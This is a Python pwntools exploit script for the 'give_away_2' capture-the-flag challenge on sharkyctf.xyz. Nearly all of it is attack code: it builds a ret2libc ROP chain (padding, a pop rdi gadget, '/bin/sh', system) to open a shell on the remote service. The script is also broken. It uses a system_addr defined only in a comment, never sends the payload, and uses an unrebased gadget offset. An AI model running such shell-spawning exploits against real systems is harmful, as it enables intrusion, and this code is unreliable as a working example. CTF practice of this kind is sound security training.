#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")
#p = process('./0_give_away')
p = remote('sharkyctf.xyz', 20335)
#p = process(['./give_away_2'],env={"LD_PRELOAD":"./libc-2.27.so"})

elf = ELF('./give_away_2')
libc=ELF('./libc-2.27.so')

#gdb.attach(p, 'b main')
#pause()
p.recvuntil('Give away: ')

main_addr=int(p.recvuntil('\n'), 16)
#system_addr=0x55733aa7d864
system_libc=libc.symbols['system']

printf_got=elf.got['printf']
printf_plt=elf.plt["printf"]
printf_libc = libc.symbols['printf']
system_got=elf.got['system']
system_libc = libc.symbols['system']
binsh_libc=libc.search("/bin/sh").next()
pop_rdi=0x0000000000000903

print "printf_got : " + hex(printf_got)
print "printf_plt : " + hex(printf_plt)
print "printf_libc : " + hex(printf_libc)
print "system_got : " + hex(system_got)
print "system_libc : " + hex(system_libc)
print "system_addr : " + hex(system_addr)

offset = system_addr - system_libc
binsh_addr= binsh_libc + offset
print "binsh_addr : " + hex(binsh_addr)

payload = 'A'*36
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
#pause()

#p.sendline(payload)
p.interactive()

